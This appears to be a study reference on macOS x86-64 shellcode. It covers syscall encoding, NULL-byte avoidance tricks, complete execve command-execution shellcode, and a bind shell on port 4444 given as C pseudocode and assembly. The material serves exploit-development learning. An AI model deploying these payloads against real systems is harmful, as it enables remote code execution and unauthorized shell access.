# Shellcode Reference

## AMD64 Calling Convention (System V / macOS)

### Register Usage

| Register | Purpose |
|----------|---------|
| RDI | 1st argument |
| RSI | 2nd argument |
| RDX | 3rd argument |
| RCX | 4th argument (note: kernel uses R10) |
| R8 | 5th argument |
| R9 | 6th argument |
| RAX | Return value / syscall number |
| RIP | Instruction pointer |
| RSP | Stack pointer (must be 16-byte aligned at call) |
| R10 | 4th arg in syscall (replaces RCX) |

### Caller-saved: RAX, RCX, RDX, RSI, RDI, R8-R11
### Callee-saved: RBX, RBP, R12-R15

## macOS BSD Syscall Interface

### Syscall Class Encoding

```
syscall_number = (class << 24) | unix_syscall_number
```

| Class | Value | Shifted |
|-------|-------|---------|
| NONE | 0 | 0x0000000 |
| MACH | 1 | 0x1000000 |
| UNIX | 2 | 0x2000000 |
| MDEP | 3 | 0x3000000 |
| DIAG | 4 | 0x4000000 |
| IPC | 5 | 0x5000000 |

### Key Syscall Numbers (UNIX class, add 0x2000000 prefix)

| # | Name | Signature |
|---|------|-----------|
| 1 | exit | `void exit(int status)` |
| 4 | write | `ssize_t write(int fd, void *buf, size_t nbyte)` |
| 30 | accept | `int accept(int s, sockaddr *addr, socklen_t *addrlen)` |
| 59 | execve | `int execve(char *path, char *argv[], char *envp[])` |
| 90 | dup2 | `int dup2(int old, int new)` |
| 97 | socket | `int socket(int domain, int type, int protocol)` |
| 98 | connect | `int connect(int s, sockaddr *addr, socklen_t addrlen)` |
| 104 | bind | `int bind(int s, sockaddr *addr, socklen_t addrlen)` |
| 106 | listen | `int listen(int s, int backlog)` |

### Invocation

```nasm
mov rax, 0x200003b    ; execve = 0x2000000 + 59
syscall               ; Invoke syscall, return in RAX
; On error: carry flag set, RAX = errno
```

## Build Toolchain

```bash
# Assemble
nasm -f macho64 shellcode.asm

# Link
ld -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib \
   -lSystem -o shellcode shellcode.o

# Extract raw bytes
objdump -d shellcode | grep -oP '(?<=\t)[0-9a-f]{2}(?= )' | tr -d '\n'

# Test for NULL bytes
objdump -d shellcode | grep ' 00 '
```

## Shellcode Pattern: Write to stdout

```nasm
global _main
section .text
_main:
    mov rax, 0x2000004      ; write
    mov rdi, 1              ; fd = stdout
    mov rbx, 'hi'           ; string on stack
    push rbx
    mov rsi, rsp            ; buf = stack pointer
    mov rdx, 2              ; nbyte = 2
    syscall

    mov rax, 0x2000001      ; exit
    xor rdi, rdi            ; status = 0
    syscall
```

## Shellcode Pattern: execve Command Execution

```nasm
; execve("/bin/zsh", ["/bin/zsh", "-c", "command"], NULL)
xor rdx, rdx              ; envp = NULL

; Build filename on stack
push rdx                   ; NULL terminator
mov rbx, '/bin/zsh'        ; 8 bytes (pad or adjust)
push rbx
mov rdi, rsp               ; rdi = filename ptr

; Build "-c" arg
push rdx                   ; NULL pad
mov rbx, '-c'
push rbx
mov rcx, rsp               ; rcx = "-c" ptr

; Get command string (jmp/call/pop technique)
jmp cmd_string
got_cmd:
    pop rbx                ; rbx = command string ptr (from call)

    ; Build argv array on stack (NULL-terminated)
    push rdx               ; NULL terminator
    push rbx               ; argv[2] = command
    push rcx               ; argv[1] = "-c"
    push rdi               ; argv[0] = "/bin/zsh"
    mov rsi, rsp           ; rsi = argv

    ; execve syscall
    push 59
    pop rax                ; small value, no NULL bytes
    bts rax, 25            ; set bit 25 = add 0x2000000
    syscall

cmd_string:
    call got_cmd
    db "id", 0             ; command to execute
```

## NULL Byte Elimination Techniques

| Problem | Solution |
|---------|----------|
| `mov rax, 59` (contains 0x00 padding) | `push 59; pop rax` |
| `mov rax, 0x200003b` (leading zeros) | `push 59; pop rax; bts rax, 25` |
| Need zero register | `xor rdx, rdx` |
| String termination | Push `xor`'d register first, then string |
| Value like 0x100 | `mov al, 0xff; inc al` or shift tricks |
| 8-byte string < 8 chars | Pad carefully, or push as smaller chunks |

### The `bts` Trick

```nasm
push 59         ; 0x3b - no NULL bytes
pop rax         ; rax = 0x3b
bts rax, 25     ; set bit 25: rax = 0x200003b (UNIX class + execve)
```

## Bind Shell Shellcode

### C Pseudocode

```c
// 1. Create socket
int fd = socket(AF_INET/*2*/, SOCK_STREAM/*1*/, IPPROTO_IP/*0*/);

// 2. Bind to port
struct sockaddr_in addr = {
    .sin_len    = 0,
    .sin_family = AF_INET,      // 2
    .sin_port   = htons(4444),  // 0x5c11 -> stored as 0x115c
    .sin_addr   = INADDR_ANY,   // 0
};
bind(fd, (struct sockaddr *)&addr, sizeof(addr));

// 3. Listen
listen(fd, 0);

// 4. Accept connection
int conn = accept(fd, NULL, NULL);

// 5. Redirect stdio
dup2(conn, 2);  // stderr
dup2(conn, 1);  // stdout
dup2(conn, 0);  // stdin

// 6. Execute shell
execve("/bin/zsh", NULL, NULL);
```

### Key ASM Details

```nasm
; sockaddr_in on stack (16 bytes, little-endian):
; sin_len(1) + sin_family(1) + sin_port(2) + sin_addr(4) + sin_zero(8)
xor rdi, rdi
push rdi                    ; sin_zero (8 bytes)
mov dword [rsp-4], 0        ; sin_addr = INADDR_ANY
mov word [rsp-6], 0x5c11    ; sin_port = htons(4444)
mov byte [rsp-7], 0x02      ; sin_family = AF_INET
mov byte [rsp-8], 0x10      ; sin_len = 16
sub rsp, 8

; Save socket fd in R9, connection fd in R10

; dup2 loop (2, 1, 0):
mov rsi, 2
dup2_loop:
    push 90
    pop rax
    bts rax, 25             ; 0x200005a = dup2
    mov rdi, r10            ; conn fd
    syscall
    dec rsi
    jns dup2_loop           ; loop while RSI >= 0
```

## C-Based Shellcode Technique

### Avoiding RIP-Relative Addressing

```c
// BAD: compiler generates RIP-relative LEA for string literals
char *path = "/bin/zsh";

// GOOD: char array on stack, no RIP-relative reference
char path[] = {'/', 'b', 'i', 'n', '/', 'z', 's', 'h', 0};
```

### Function Pointer Typedefs (Avoiding Stub Calls)

```c
// Define function pointer type
typedef int *(*execv_t)(const char *, char * const *);

// Find address at runtime:
// printf("0x%lx\n", (unsigned long)execv);

// Use hardcoded address (from dyld shared cache)
execv_t my_execv = (execv_t)0x7fff20420e08;
char path[] = {'/', 'b', 'i', 'n', '/', 'z', 's', 'h', 0};
my_execv(path, NULL);
```

### Compile as Position-Independent Shellcode

```bash
# Compile to object
gcc -c shellcode.c -o shellcode.o

# Extract .text section bytes
objcopy -O binary -j .text shellcode.o shellcode.bin
```
